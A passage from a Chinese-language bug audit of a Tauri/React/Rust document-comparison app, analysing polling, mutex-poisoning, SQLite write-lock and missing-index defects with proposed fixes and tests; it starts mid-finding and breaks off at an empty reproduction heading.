(3) 命令 resolve → useImportDocuments.onSuccess（data.ts:233-237）执行两次 invalidate：['documents',wsId] 与 ['jobs']。前者触发 useDocuments 立即 refetch。
(4) 该 refetch 在毫秒级返回：listDocuments（document_repo::list, document_repo.rs:78-85）此刻查不到本批任何 parsing 行（run_import 还在校验/哈希阶段，尚未走到 create_parsing）。refetch 成功后 TanStack 重算 refetchInterval 谓词（data.ts:113-115）：data.some(d=>d.status==='parsing') → false → 关闭轮询。**documents 查询的轮询通道就此熄火。**
(5) 与此同时 run_import 在后台线程继续：阶段 A 顺序哈希去重（import_service.rs:121-176），阶段 B 并行 import_one（184-192），在 import_one 内 create_parsing 才把行以 status='parsing' INSERT（255-267，SQL 见 document_repo.rs:64-68），紧接着 parse_file_blocks_opt 做解析+OCR（270-275）。扫描件 OCR 可达分钟级，该行在 DB 里就以 'parsing' 存在数分钟——**但没有任何东西把它拉进 query cache**。
(6) 唯一可能刷新的通道是事件。progress 事件（document:import:progress）经 progressStore.ts:40-44 只调用 onProgress → 写 zustand progress map，**从不 invalidate query**，且 payload（JobProgress, progress.rs:9-17）根本不含文档行。真正 invalidate ['documents'] 的只有 TERMINAL 事件回调（progressStore.ts:56-57）。
(7) 结论：正常路径下终态事件到达才一次性刷出 parsed 结果——'解析中…' Pill（CompareSetup.tsx:552）在多数情况下压根不出现；而一旦终态事件丢失（webview 未订阅完成、任务终态在 initJobEvents 前触发、emit 失败 progress.rs:62-64 只 warn 不重试），documents 列表将**永久停在导入前的旧态**，且 refetchOnWindowFocus:false（main.tsx:28）+ 无 refetchInterval，再无任何触发源自愈。架构文档 docs/architecture-analysis-v0.4.md:50 与 :117 仍以 data.ts:114-116 为据宣称"事件+轮询双通道兜底、不信任单一通道"——对 documents 而言该背书不成立。

**最小复现**

评标真实场景：审核员在一个工作区里一次拖入 3 份 25 页扫描件标书（PDF 图片层，需 OCR），三家投标人。
- 观察 1（默认路径，退化但暂时收敛）：点导入后 documents 列表长时间空白/不变，'解析中…' 标签基本不出现（因 documents 不轮询）；直到每份 OCR 跑完、document:import:completed 到达才"啪"地一次性冒出 3 份 parsed。期间进度条能动（那走 useJobs 的 1s 轮询 + progress 事件写 zustand），但文档列表与进度体验割裂。
- 观察 2（终态事件丢失，永久停旧态，STRUCT 核心）：导入进行中切换路由/工作区再切回、或 initJobEvents 尚未 await 完监听就已收到终态、或多窗口场景，使 document:import:completed 未被本 webview 收到。此时后台 OCR 早已完成、DB 里 3 行都是 status='parsed'，但前端 documents 缓存仍是导入前的旧快照，列表不刷新、无法勾选比对，用户须手动刷新/重进页面才恢复。useJobs 轮询会把任务标记为 completed，于是出现"任务已完成但文档列表还是空/旧"的自相矛盾态。

**影响面**

受影响：所有走 useDocuments 的界面在导入期的列表刷新（主要 CompareSetup.tsx，导入后选标书发起比对的必经屏）。默认配置命中：refetchOnWindowFocus:false（main.tsx:28）与该 refetchInterval 谓词均为默认代码路径，无需任何开关即触发，OCR 扫描件是本产品高频输入。严重度：观察 1 是体验退化（'解析中'态缺失、列表滞后到终态才更新），非数据错误；观察 2 是功能性卡死（列表永久停旧态，须手动刷新），破坏"导入即见、见即可选比对"的核心流。发生频率：观察 1 每次带解析耗时的导入都发生；观察 2 依赖终态事件丢失，属偶发但确定性可复现（路由切换/时序竞态），且一旦发生无自愈。不误告红线不直接受损（不产生假雷同），但"文档看似没导入成功"会诱导用户重复导入或误判，间接侵蚀取证可信度。

**修复设计**（尚未落地）

目标：让 useDocuments 的轮询在"本工作区存在 live import 任务"期间保持开启，把 documents 查询挂回已经工作的 jobs 信号上，恢复真正的双通道。改动集中在 src/queries/data.ts，不碰 Rust。

方案（推荐，最小且可测）：把 useDocuments 的轮询条件从"缓存里有 parsing 文档"改为"缓存里有 parsing 文档 OR 本工作区有 live import 任务"。live import 从 jobs 缓存直接读，避免新增订阅。

1) 抽出可测谓词（当前是内联箭头，无法单测）：
```ts
export function hasLiveImport(jobs: JobDto[] | undefined): boolean {
  return !!jobs?.some((j) => j.jobType === "import" && isLive(j));
}
export function shouldPollDocuments(
  docs: DocumentDto[] | undefined,
  jobs: JobDto[] | undefined,
): boolean {
  return !!docs?.some((d) => d.status === "parsing") || hasLiveImport(jobs);
}
```
2) useDocuments 读取同 wsId 的 jobs 缓存并入判：
```ts
export function useDocuments(workspaceId: string | undefined) {
  const qc = useQueryClient();
  return useQuery({
    queryKey: ["documents", workspaceId],
    queryFn: () => api.listDocuments(workspaceId!),
    enabled: !!workspaceId,
    refetchInterval: (q) => {
      const jobs = qc.getQueryData<JobDto[]>(["jobs", workspaceId ?? "all"]);
      return shouldPollDocuments(q.state.data, jobs) ? 1000 : false;
    },
  });
}
```
注意：useJobs 的 queryKey 是 ['jobs', workspaceId ?? 'all']（data.ts:185），CompareSetup 用 useJobs(wsId) 故键为 ['jobs', wsId]，getQueryData 必须用同一归一化键，否则读不到。useImportDocuments.onSuccess 已 invalidate ['jobs']（data.ts:235），使 useJobs 立刻 refetch 到 pending import 任务；此后 useDocuments 每 1s 轮询直到 import 任务终态 + parsing 行清零，才回落 false——即使终态事件丢失，poll 也会最终收敛到 parsed。

副作用/一并改：
- refetchInterval 依赖 qc.getQueryData 读另一查询，属于"派生轮询"，其重算时机由本查询 fetch/失效驱动；onSuccess 里 documents 与 jobs 同批 invalidate，能保证首轮 documents refetch 时 jobs 已在刷新，谓词短暂可能仍 false，但 useJobs 自身 1s 轮询会拉到 pending 任务、随后 documents 首次成功 refetch 触发谓词重算——为稳妥可在 useImportDocuments.onSuccess 里对 documents 追加一次"下一 tick" refetch，或直接依赖 jobs poll 拿到任务后由 window 无关的 interval 兜底（当前方案已足够）。
- 需同步订正文档：docs/architecture-analysis-v0.4.md:50 与 :117 关于"事件+轮询双通道"的表述——修复后对 documents 才真正成立，应注明 documents 轮询依赖 jobs 信号而非自身 parsing 行。
- data.ts:3 顶部注释"运行中任务由事件驱动失效 + 轮询兜底"可保留，修复后名副其实。
- 无迁移号变更（纯前端）。

备选（次选）：在 progressStore.ts 的 document:import:progress 回调里节流 invalidate ['documents']。缺点：progress 节流在 Rust 侧（jobs/mod.rs:72-94），前端还要再套一层节流防抖，且 import 期高频 invalidate 会与 staleTime 交互；不如挂 jobs 信号干净。

**钉死测试**

文件：src/queries/data.test.ts（新增，沿用现有纯函数 vitest 风格，见 src/utils/docTag.test.ts；项目无 jsdom/@testing-library，故不做 hook 渲染测试，改测抽出的谓词）。
前置：修复须先把轮询判定抽成导出的纯函数 shouldPollDocuments(docs, jobs)（见 fixDesign）。
用例：
- describe('shouldPollDocuments')
  - it('无 parsing 文档但有 live import 任务时应轮询（旧代码在此失败）'): 断言 shouldPollDocuments([{status:'parsed'} as any], [{jobType:'import',status:'running'} as any]) === true。旧内联谓词只看 docs.some(parsing)，等价函数会返回 false → 该断言在旧逻辑下失败、修复后通过。
  - it('文档含 parsing 时轮询'): shouldPollDocuments([{status:'parsing'} as any], undefined) === true。
  - it('无 parsing 且无 live import 时停止'): shouldPollDocuments([{status:'parsed'} as any], [{jobType:'import',status:'completed'} as any]) === false。
  - it('compare 任务 live 不触发 documents 轮询'): hasLiveImport([{jobType:'compare',status:'running'} as any]) === false（避免比对期无谓轮询文档）。
关键断言即第一条：旧代码 false / 新代码 true，精确钉住"终态事件丢失也能收敛"的回归。

**对原发现的修正**

机制与结论整体属实，两点精修：(1) 行号偏移——轮询谓词现位于 src/queries/data.ts:113-115（useDocuments 整体 108-117），原发现给的 113-115 正确，但"位置"标注宜含 useImportDocuments(229-238) 与 progressStore(45-67) 才完整。(2) "双通道退化为事件单点"的范围需限定：该缺陷仅存在于 useDocuments；useJobs(data.ts:187-189)/useJob(201) 的轮询是有效的，因为 import_documents→spawn 立即以 status=pending 建 job 行（jobs/mod.rs:195），jobs 缓存能在毫秒内看到 live 任务、轮询正常启动。所以架构文档 data.ts:114-116 的"双通道"背书对 jobs 成立、仅对 documents 失效——原发现说"架构文档还在为双通道背书"正确，但应指明是 documents 这一路失效，而非全部轮询失效。严重级 STRUCT 判定合理：正常路径退化(观察1)+终态事件丢失时永久停旧态(观察2)属结构性刷新缺陷而非纯 CRIT 数据错误，不误告红线未直接击穿。非设计缺陷——顶部注释(data.ts:3)明确声称"轮询兜底"，说明这是应工作却失效的意图，非有意取舍。

---

### S5 · 语义模型下载嵌在比对任务内且全程持 embedder Mutex，下载段不可取消、异常毒化锁

**级别** 🟠 STRUCT · **复核状态** refined（见文末修正） · **工作量** M

**位置**
- `src-tauri/src/services/compare_service.rs:401-406 (锁 + ensure/下载，锁内无 ctx.check())`
- `src-tauri/src/services/compare_service.rs:408 (第一个 ctx.check()，在批循环内、下载之后)`
- `src-tauri/src/services/compare_service.rs:402 (embedder.lock().unwrap())`
- `src-tauri/src/commands/tools.rs:59 (download_embedding_model 同锁 lock().unwrap())`
- `src-tauri/src/engine/embed.rs:146-153,158-178 (init_model→TextEmbedding::try_new 联网下载；ensure 无取消旗标入参)`
- `src-tauri/src/state.rs:14,33-35 (embedder: Arc<Mutex<LoadedEmbedder>> 全局单例)`
- `src-tauri/src/jobs/mod.rs:64-69,146 (ctx.check 语义；catch_unwind 兜 panic 但不消毒锁)`
- `src-tauri/src/commands/compare.rs:82,90 (enable_semantic / allow_model_download 映射)`
- `src-tauri/src/config.rs:37,102 (两开关默认 false)`

**机制（逐环调用链）**

逐环调用链（当前代码，行号已核实）：1) compare.rs:82 enable_semantic=request 或默认(config.rs:37=false)；compare.rs:90 allow_model_download=security.allow_cloud_model(config.rs:102 默认 false)。2) compare_service.rs:159 若 cfg.enable_semantic 为真→161 调 embed_chunks(ctx, embedder, comparable, spec, allow_model_download)。3) embed_chunks 387-390 先查 embedding 缓存表；392-396 算 missing；398-399 progress("semantic",0,total)。4) 若 missing 非空→402 `let mut guard = embedder.lock().unwrap();`（获取全局 embedder 锁）。5) 403 `embed::ensure(&mut guard, spec, allow_download)`：ensure(embed.rs:158) 当 slot 为空且 (allow_download || model_cached_for(spec)) 为真时→173 init_model→embed.rs:152 `TextEmbedding::try_new(opts)`，fastembed 在此**同步联网下载**模型文件（bge-large-zh ~1.2GB、e5-large ~2.1GB），全程持锁、无进度。6) 关键缺陷：从 402 拿锁到 407 进批循环之间**没有 ctx.check()**；第一个 check() 在 408（循环体首行），只有下载完成后才轮到。故用户在下载期间点取消→jobs/mod.rs:241 f.store(true) + set_cancelling 落库，但任务体卡在 try_new 里不看旗标→UI 停在 cancelling、semantic 进度停 0/total，直到下载结束（或超时/网络失败）才在 408 check() 抛 JobCancelled。7) 反向阻塞：tools.rs:59 download_embedding_model 也 `embedder.lock().unwrap()`——比对任务持锁下载 2GB 期间，用户在工具屏点某模型下载会阻塞在 lock() 直到比对释放；反之亦然（工具屏下载持锁时比对任务的 402 lock() 阻塞）。8) 毒化链：try_new/embed 若在持 guard 期间 panic（如 ort 运行时/内存异常），guard 在栈展开时 drop→Mutex 被标记 poisoned；jobs/mod.rs:146 catch_unwind 捕获 panic 使进程不崩、任务记 failed，但**锁已中毒**；此后任何 402 或 tools.rs:59 的 `.lock().unwrap()` 都会因 PoisonError 再 panic→语义功能与模型下载命令全部失效，直到重启进程。

**最小复现**

真实评标场景：办案人员导入 4 份同标段投标文件（各约 40 页、含扫描件），在比对设置里勾选『启用语义查重』、并在设置中打开『允许联网下载模型』，选中 e5-large（多语种大模型，尚未下载）。点击开始比对：任务跑完词面阶段、进入 semantic 阶段后卡住（进度条显示『语义向量（缓存命中 0）』0/total 不动），因为 402 拿锁后在 403 的 try_new 里静默下载 ~2.1GB。此时办案人员发现选错模型想取消→点取消，UI 立刻变『cancelling…』但任务纹丝不动，必须等 2GB 下完（弱网/断网下可能数分钟到十几分钟，或直到网络错误）才真正结束。期间若再去工具屏想下别的模型，下载按钮转圈卡死（同锁）。极端：下载中 ort 运行时异常 panic→任务记失败，之后重新发起语义比对直接崩语义功能（poisoned lock panic），只能重启 app。

**影响面**

受影响：开启语义查重且允许联网、且所选模型未缓存的用户（首次使用某语义模型的必经路径）。默认配置**不命中**——enable_semantic 与 allow_cloud_model 均默认 false（config.rs:37/102），需用户显式双开且模型未缓存才触发；这是对原发现『默认配置是否命中』的重要修正：不是默认路径。严重程度：STRUCT 合理——(a) 取消无响应违背『可控/宁转人工』体验，下载期最长可达数分钟至十几分钟不可打断；(b) 与工具屏下载互锁，产品把『显式下载』设计成规避『比对时突然卡住』的手段，但二者共用一把粗锁反而互相阻塞；(c) poisoned lock 是真实的功能级致命退化（语义查重直到重启不可用），虽有 catch_unwind 保命不崩进程。频率：首次启用某新模型必然经过下载段（每模型一次），取消/互锁在该窗口内可复现；毒化取决于 try_new 是否 panic，属低频但后果重。不涉及数据损坏，不违反离线承诺（未联网时 ensure 直接 return None 降级，不会误下载）。

**修复设计**（尚未落地）

三处协同修复（本任务不改文件，仅给设计）：
1) 【下载移出锁 + 加取消检查】把『首次联网下载』从比对任务体里剥离，或至少在 ensure 前后夹取消检查、并让 ensure 感知取消。最小侵入方案：
   - embed.rs: 给 ensure 增加可选取消旗标参数，或新增 `ensure_cancellable(slot, spec, allow_download, cancel: &AtomicBool)`；但 fastembed try_new 本身不可中断，真正解法是**比对任务内禁隐式下载**：embed_chunks 传给 ensure 的 allow_download 恒为 false（未缓存即走 405 的 degraded 返回），下载只允许在 tools.rs 工具屏显式发起。伪代码（compare_service.rs:402-406）：
     ```rust
     ctx.check()?;                          // 拿锁前先看取消
     let mut guard = embedder.lock().unwrap_or_else(|e| e.into_inner());
     // 比对内一律不下载：allow_download=false，未缓存→降级
     let Some(model) = embed::ensure(&mut guard, spec, false) else {
         ctx.progress("semantic", total, total, "语义模型未缓存，已降级为词面比对（可在工具屏预先下载）");
         return Ok((None, true));
     };
     ```
     副作用：语义 degraded 从『try_new 联网失败』变成『显式引导用户去工具屏下载』——需同步 373-374 行文档注释（『含 allowCloudModel=false 且本地无缓存时降级』要补『或未在工具屏预下载时降级』），并在前端 degraded 提示里给出跳转工具屏下载的引导（compare.rs 的 allow_model_download 参数可保留给 tools 用，或从比对路径彻底移除）。
   - 若产品坚持保留『比对时按需下载』：则必须把 try_new 放到锁外（先释放 guard→spawn 一个可被 cancel 观察的下载、轮询 cancel_flag 决定是否 abort），复杂度显著上升，属 L 级，不推荐。
2) 【消毒锁】两处 `.lock().unwrap()`（compare_service.rs:402、tools.rs:59）统一改 `.lock().unwrap_or_else(|e| e.into_inner())`，让 poisoned 后仍能拿到内部 LoadedEmbedder（内部是 Option<(String,TextEmbedding)>，即便半初始化，下次 ensure 会按 id 不符/None 重载，安全）。这样即使某次 try_new panic 毒化锁，语义功能不因锁中毒而永久瘫痪。
3) 【锁前取消检查】compare_service.rs:401 与 402 之间加 `ctx.check()?;`（拿锁前即响应取消，避免刚被前一任务释放又立刻进不可取消段）。
需一并改：373-374 doc 注释、前端 degraded 文案与工具屏引导；无 DB 迁移号变更。推荐落地范围=方案1(禁隐式下载)+2(消毒)+3(锁前check)，最贴合『可见可管』设计与离线价值观。

**钉死测试**

放在 src-tauri/src/services/compare_service.rs 的 #[cfg(test)] mod 内（已有 ctx_for/for_test 基建）。
测试1 `embed_chunks_never_downloads_inside_compare`：构造 allow_download=true 但目标模型未缓存的场景，断言 embed_chunks 返回 (None, true)（degraded）而**不**发起 try_new——旧代码会走 403 ensure(allow=true) 尝试下载，修复后恒 false→降级。因 try_new 真下载不宜进单测，可用注入点：把 ensure 的下载判定抽成可 mock 的 trait/闭包，断言比对路径传入的 allow_download==false（关键断言：`assert_eq!(captured_allow_download, false)`）。
测试2 `embed_chunks_checks_cancel_before_lock`：用 for_test 构造 cancel=true 的 JobCtx，在有 missing 的输入上调 embed_chunks，断言返回 Err(code==JobCancelled) 且未触及 embedder（旧代码 401 后无 check、直接进 402 拿锁；修复后 401.5 的 ctx.check()? 立刻返回）。关键断言：`assert_eq!(err.code, AppErrorCode::JobCancelled)`。
测试3 `poisoned_embedder_lock_recovers`（放 embed.rs 或 tools 测试）：先制造一次持锁 panic 毒化 Arc<Mutex<LoadedEmbedder>>，再断言 `mutex.lock().unwrap_or_else(|e| e.into_inner())` 能拿到 guard 且后续 ensure 可重新加载——旧代码 `.lock().unwrap()` 在此 panic，新代码通过。

**对原发现的修正**

1) 【重要】原发现称此为默认路径隐患，但默认配置**不命中**：enable_semantic 默认 false（config.rs:37）、allow_cloud_model 默认 false（config.rs:102），需用户显式双开且所选模型未缓存才触发下载段。原文『enableSemantic+allowCloudModel+未缓存时』其实已隐含此前提，但『默认配置是否命中』应明确答『否』。2) 行号微修：锁在 402、ensure/降级在 403-406、第一个 ctx.check() 在 408（原文『402 行拿锁…下一个在 408 批循环』正确，此处仅确认属实）；tools 侧同锁在 59（原文写 57，实际 lock() 在 59，57 是 spawn_blocking）。3) 毒化路径属实但需澄清：catch_unwind 在 jobs/mod.rs:146 只兜 worker panic 使进程不崩、任务记 failed，它**不会**消毒 Mutex；毒化后果（语义/下载命令 lock().unwrap() 再 panic 到重启才恢复）成立。4) 严重级 STRUCT 维持合理，非纯设计问题——取消无响应+粗锁互锁+毒化三条叠加确属结构性；但因非默认路径、无数据损坏、有 catch_unwind 保命，不应升到 CRIT。

---

### S6 · 写串行锁 db_write 是 run_import 局部变量，仅串行单任务内 rayon 并行写；跨任务(跨工作区/同区 import+compare)并发写事务仅靠 5s busy_timeout 兜底，撞锁即 database is locked 假失败

**级别** 🟠 STRUCT · **复核状态** refined（见文末修正） · **工作量** M

**位置**
- `src-tauri/src/services/import_service.rs:183`
- `src-tauri/src/services/import_service.rs:187`
- `src-tauri/src/services/import_service.rs:224`
- `src-tauri/src/services/import_service.rs:233`
- `src-tauri/src/services/import_service.rs:246`
- `src-tauri/src/services/import_service.rs:362`
- `src-tauri/src/services/compare_service.rs:260`
- `src-tauri/src/services/compare_service.rs:261`
- `src-tauri/src/services/compare_service.rs:420`
- `src-tauri/src/db/mod.rs:23`
- `src-tauri/src/db/repo/job_repo.rs:92`
- `src-tauri/src/db/repo/template_repo.rs:103`
- `src-tauri/src/jobs/mod.rs:117`
- `docs/architecture-analysis-v0.4.md:48`
- `docs/multi_document_compare_react_tauri_arch_design.md:2209`

**机制（逐环调用链）**

逐环调用链（均已 Read 当前代码属实）：
1) import_service.rs:183 `let db_write = std::sync::Mutex::new(());` —— 该 Mutex 是 run_import 的**栈局部变量**，生命周期只在本次 run_import 调用内。它传给 import_one(:187) 并在 :233/:256/:278/:286/:307 被 lock，只能串行**同一个 run_import 调用内**由 rayon(par_iter :184) 发起的并发写。两个不同的 run_import 调用各自 new 一把独立锁，互不感知。
2) 跨任务写并发的入口：jobs/mod.rs:189 `job_repo::has_active(&tx, workspace_id, job_type)` —— job_repo.rs:92-99 的 SQL 仅按 `workspace_id AND job_type` 计数未完结任务。因此(a)工作区 A 的 import 与工作区 B 的 import 可同时 running；(b)同一工作区的 import 与 compare(不同 job_type)可同时 running。has_active 完全不挡这两类。
3) 两个 running 任务各自持有独立 db_write 锁，但共享同一个 8 连接文件池(db/mod.rs:30 max_size=8)与同一个 bidguard.db 单写者。当二者的写事务在时间上重叠：
   - import 侧 persist_parsed(import_service.rs:340) `conn.transaction()`(rusqlite 默认 DEFERRED)+ chunk_repo::insert_all，大文档(~1200 段)提交可达数秒；
   - compare 侧 persist(compare_service.rs:261) 同样 `conn.transaction()` DEFERRED，随后 insert_edges/insert_clusters/replace_for_chunks 一并提交；compare 的 embedding 写(compare_service.rs:420-421 embedding_repo::insert_many)也在跑。
4) SQLite 单写者：先拿到写锁的事务提交需数秒，另一方的第一个 INSERT 触发写锁获取失败→进入 busy_handler 忙等，busy_timeout(db/mod.rs:23 = 5000ms)耗尽仍拿不到→返回 SQLITE_BUSY(`database is locked`)。
5) 该 rusqlite::Error 经 AppError::from 变成 DatabaseError 向上抛：import 侧 persist_parsed 返回 Err→import_one:322 return Err→run_import:197 `r?` 冒泡；compare 侧 :274 tx.commit()? 冒泡。
6) 终态落库被吞：jobs/mod.rs:117 `if let Ok(conn) = db.get() { let _ = job_repo::finish(...) }` —— finish 的返回值被 `let _` 丢弃。撞锁窗口内 finish 自己也可能拿不到写锁/超时失败，则 jobs 行永远停在 running，直到进程重启由启动清理兜底。
7) 未受 busy_timeout 保护的 BUSY_SNAPSHOT 变体：persist_cached(import_service.rs:356→copy_all:146 先 SELECT 后 INSERT)与 template_repo::batch_save(:103 先 SELECT source_templates 后 INSERT)都是同一 DEFERRED 事务内**先读后写**。DEFERRED 事务首个语句是 SELECT→拿读锁并建立快照；随后 INSERT 试图升级为写锁时，若期间别的连接已提交过写→返回 SQLITE_BUSY_SNAPSHOT，此错误**不触发 busy_handler**(busy_timeout 对它无效)，即刻失败。

**最小复现**

真实评标场景，默认配置(文件库 8 连接、busy_timeout=5s)：
场景一(同工作区 import+compare 并发)：某工作区已导入 3 份标书，用户点「开始比对」(compare 任务 running，正在 persist 边/聚类/facts 或写 embedding 缓存)；同时用户又拖入第 4 份 25 页扫描件点「导入」——has_active 只查 import 类型无冲突→放行。compare 的写事务与 import 的 persist_parsed 大事务重叠超 5s→其一 `database is locked` 假失败。
场景二(跨工作区双 import)：招标代理开两个工作区，各导入一批 25 页扫描件(OCR 后每份千段级大事务)，几乎同时点导入。两个 run_import 各持独立局部锁，写事务在文件池上重叠→撞锁失败。
场景三(缓存复用 BUSY_SNAPSHOT)：工作区 B 导入一份与工作区 A 同内容同配置的标书→走 persist_cached(copy_all 先读后写)；此刻工作区 A 有别的写在提交→copy_all 的 INSERT 触发 SQLITE_BUSY_SNAPSHOT，不受 5s 兜底，立即失败。

**影响面**

影响面：任何「两个写任务时间重叠」的用户操作路径——跨工作区并发导入、同工作区 import+compare 并发、缓存复用/模板批量保存撞上任意写。默认配置(open() 用文件库 8 连接、busy_timeout 5s、rusqlite DEFERRED 事务)**直接命中**，无需特殊开关。严重度：STRUCT 恰当——不是每次必现(需写窗口重叠数秒)，但一旦命中是**任务假失败**(报 database is locked，用户误以为标书有问题)，叠加 jobs/mod.rs:117 吞错可致任务**永久卡 running 到重启**，违背「宁转人工不误告」。频率：单机个人用轻度使用较低；招标代理/多工作区批量作业+大扫描件 OCR 场景显著升高。BUSY_SNAPSHOT 变体一旦触发完全绕过 5s 兜底，更脆。

**修复设计**（尚未落地）

不改文件，仅给方案。推荐 A+B 组合：

A) 写锁提升为 AppState 级全局(根治并发写序列化)：
- state.rs 的 AppState 增 `db_write: Arc<std::sync::Mutex<()>>`(与 embedder 同样 Arc 共享)。
- run_import(import_service.rs) 与 run_compare(compare_service.rs) 签名接收 `&Arc<Mutex<()>>`，import 内删除 :183 局部 `let db_write = Mutex::new(())`，改用传入的全局锁；compare 的 persist(:259-275)与 embedding insert(:419-422)也在全局锁内串行。
- 伪代码(import_service.rs):
  ```
  // 删除 let db_write = std::sync::Mutex::new(());
  // 改为参数 db_write: &std::sync::Mutex<()> 由 AppState 传入
  ```
  compare persist:
  ```
  let _w = db_write.lock().unwrap();
  let mut conn = ctx.db.get()?;
  let tx = conn.transaction()?; ... tx.commit()?;
  ```
- 副作用/需一并改：commands/document.rs 与 commands/compare.rs 派发 worker 处需把 AppState 的锁 clone 进闭包；export/测试里 run_compare/run_import 全部调用点(compare_service.rs 测试 :889/:985/... 及 export_service.rs:340)需补参数。锁持有期间不得调用 ctx.progress()(progress 自取连接，见 import :155 注释)——现有代码已在锁外 progress，保持。

B) 长事务改 IMMEDIATE + 调大 busy_timeout(消除 BUSY_SNAPSHOT + 给全局锁外的残余并发兜底):
- persist_cached(:357)、batch_save(template_repo.rs:103)、compare persist(:261) 的 `conn.transaction()` 改 `conn.transaction_with_behavior(TransactionBehavior::Immediate)`——事务一开即拿写锁，先读后写不再有快照升级失败，SQLITE_BUSY_SNAPSHOT 消失、改由 busy_handler 覆盖。参照 jobs/mod.rs:187 已有 IMMEDIATE 用法。
- db/mod.rs:23 busy_timeout 5000→建议 15000ms，覆盖千段级大事务提交时长。

C) 修 jobs/mod.rs:117 吞错：finish 失败应记日志(不含正文，符合日志规约)并保证 running 不残留——至少 `if let Err(e)=job_repo::finish(...) { log::error!("finish job failed: {e}") }`。可选：撞锁类 DatabaseError 上层重试一次。

D) 同步纠正文档措辞(它们把局部锁误述为进程级/全局)：
- docs/architecture-analysis-v0.4.md:48 「所有 DB 写持一把进程级 Mutex 串行」——改为「单个导入任务内 DB 写串行(局部 db_write Mutex)」或在采纳 A 后改为真正的进程级并注明覆盖 import+compare。
- docs/multi_document_compare_react_tauri_arch_design.md:2209 「import_service 内一把 db_write Mutex 让解析并行/写串行」同上；:2216 已如实记 Embedder 单锁串行，可补一句写锁作用域。
- import_service.rs:179-180 注释「这把写锁让任一时刻只有一个写事务」措辞过强(实际仅单任务内)，一并订正。

**钉死测试**

测试名 `cross_task_concurrent_writes_do_not_busy_error`，放 src-tauri/src/services/import_service.rs 的 #[cfg(test)] mod tests(复用已有 write_min_docx / open 文件库工具)。关键构造与断言：
1) `crate::db::open(&dir)` 建文件库(8 连接，必须文件库——内存库 max_size=1 复现不了，见现有 concurrent_import 测试注释 :439-441)。
2) 建两个工作区 wsA/wsB(或同区 import+compare)；各造一份千段级大 docx(参照 :450-457 的 1200 段)。
3) 两线程 `std::thread::spawn` 各调 run_import(wsA)/run_import(wsB)，共享同一 pool，join。
4) 断言(旧代码失败/修复后通过)：`assert!(docs_a.iter().all(|d| d.status=="parsed"))` 且 `docs_b` 同样全 parsed，`d.chunk_count>0`；并断言两任务 jobs 行终态均为 completed 而非 failed/卡 running。
补充 `busy_snapshot_on_cached_import` 针对 persist_cached：并发一方持续写、另一方走 copy_all 缓存路径，断言缓存导入仍成功(parse_method="cache")不报 database is locked。注：旧代码因两把独立局部锁+5s 超时，在大事务重叠下应观察到 SQLITE_BUSY 失败使断言不成立;若本机太快难稳定复现，可临时把 busy_timeout 调 0 或增大文档段数放大写窗口。

**对原发现的修正**

原发现基本准确，三点精化：1) 「db_write 是 run_import 局部变量」属实(import_service.rs:183 为栈局部 Mutex，非 AppState 成员)，措辞可更强调「每次 run_import 各 new 一把独立锁」。2) BUSY_SNAPSHOT 的两处(persist_cached 的 copy_all、template_repo::batch_save)确为先读后写且用 rusqlite 默认 DEFERRED 事务，不受 busy_timeout 保护——属实；但需注意 compare 的 persist(compare_service.rs:261)与 import 的 persist_parsed(:340)虽也是 DEFERRED，其事务首语句即 INSERT(写)，故走 busy_handler(受 5s 兜底)而非 BUSY_SNAPSHOT——原发现只点名前两处正确，此处补充边界。3) 文档误述在两处：docs/architecture-analysis-v0.4.md:48 与 docs/multi_document_compare_react_tauri_arch_design.md:2209，原发现只泛指「docs 误称进程级 Mutex」，实际前者用「进程级 Mutex」、后者用「一把 db_write Mutex…写串行」，两处都需订正。commit 引入锁的哈希为 9bc84c3(与原发现一致)。严重级 STRUCT 判定恰当(非必现但假失败+吞错卡 running，非纯设计取舍)。

---

### S7 · cluster_members 级联外键(chunk_id/document_id)无索引，删文档退化为每 chunk 全表扫 O(chunks×members)

**级别** 🟠 STRUCT · **复核状态** refined（见文末修正） · **工作量** S

**位置**
- `src-tauri/src/db/migrations.rs:173-180 (CREATE TABLE cluster_members，PK=(cluster_id,document_id,chunk_id)，chunk_id/document_id 均 ON DELETE CASCADE，全库无对应 CREATE INDEX)`
- `src-tauri/src/db/repo/document_repo.rs:192-198 (remove: DELETE FROM documents WHERE id=?1，触发 chunks 级联，再触发 cluster_members.chunk_id 级联)`
- `src-tauri/src/commands/document.rs:74-76 (remove_document 命令入口)`
- `src-tauri/src/db/repo/workspace_repo.rs:94-100 (delete: DELETE FROM workspaces WHERE id=?1)`
- `src-tauri/src/commands/workspace.rs:57-60 (delete_workspace 命令入口)`
- `src-tauri/src/db/mod.rs:19-24 (init_conn: WAL + foreign_keys=ON + synchronous=NORMAL + busy_timeout=5000ms)`
- `src-tauri/src/db/mod.rs:30 (open: r2d2 连接池 max_size=8)`

**机制（逐环调用链）**

逐环调用链(均已 Read 当前代码逐行核实)：
1) 入口 src-tauri/src/commands/document.rs:74 remove_document → :75 document_repo::remove(&*conn(&state)?, &document_id)。conn() 从 r2d2 池(mod.rs:30 max_size=8)取一条 WAL 连接，foreign_keys=ON(mod.rs:22)。
2) document_repo.rs:193 `DELETE FROM documents WHERE id = ?1`。documents 无外层事务包裹，单条 DELETE 即隐式事务，全程持 WAL 写锁。
3) FK 级联：documents→chunks(migrations.rs:72 ON DELETE CASCADE，有 idx_chunks_document_id:89，用 idx 找到该文档全部 chunk，快)。
4) 每删 1 个 chunk，再触发 chunks→cluster_members(migrations.rs:176 chunk_id ON DELETE CASCADE)。SQLite 对每个被删 chunk 执行一次 `DELETE FROM cluster_members WHERE chunk_id=?`。cluster_members 除 PK autoindex(cluster_id 最左)外无任何索引 → EXPLAIN QUERY PLAN 实测为 `SCAN cluster_members`(全表扫)。删文档场景 chunks 级联发生在 cluster_members 的 clusters 级联之前(clusters 挂在 jobs 下，删文档不删 job/cluster)，故 members 全程满员=M，chunk 数=N，总代价 O(N×M)。
5) 删工作区(workspace_repo.rs:95)同链路，且额外 document_id ON DELETE CASCADE(migrations.rs:175)同样 `SCAN cluster_members`。
实测(SQLite 3.50.2，磁盘库，synchronous=OFF 隔离纯扫描代价，删一整份文档保持 clusters 存活即真实 delete_document 最坏情形)：4000 chunks×10000 members=1607ms(无索引) vs 24ms(有索引)，68x；8000 chunks×30000 members=11943ms≈12s(无索引) vs 27ms(有索引)，442x。EXPLAIN 证：无索引 `SCAN cluster_members`；建 idx_cluster_members_chunk 后 `SEARCH ... USING INDEX idx_cluster_members_chunk (chunk_id=?)`。

**最小复现**

